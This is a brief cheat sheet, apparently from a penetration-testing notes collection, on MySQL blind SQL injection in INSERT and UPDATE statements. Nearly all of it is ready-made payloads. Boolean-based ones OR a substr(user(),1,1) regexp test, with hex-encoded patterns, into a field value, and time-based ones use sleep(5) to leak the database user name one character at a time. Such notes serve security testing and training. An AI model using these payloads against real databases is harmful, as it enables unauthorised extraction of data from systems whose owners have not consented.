## Mysql

#### MySQL Blind Injection in Insert and Update Statements


##### Boolean Based Blind Injection:

If the result is true the entry will be updated with a ‘1’ and if the result is false the entry will be updated with a ‘0’.

USAGE :  regexp anyregex with or without hex encoding if
eg: with hex encoding r to hex is 72 add 0x also,

```update users set username = ‘0’ | (substr(user(),1,1) regexp 0x72) where id=14;```

now it will set username to 1 if user's first letter is r
```
update users set username = ‘0’ | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;
 
 Without regexp
 UPDATE users set username = '0'| (substr(user(),1,1) = 'r');


insert into users values (15,’osanda’,'0'| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));
```

##### Time Based Blind Injection

```
update users set username = '0'|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;

insert into users values (16,’osanda’,'0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
```
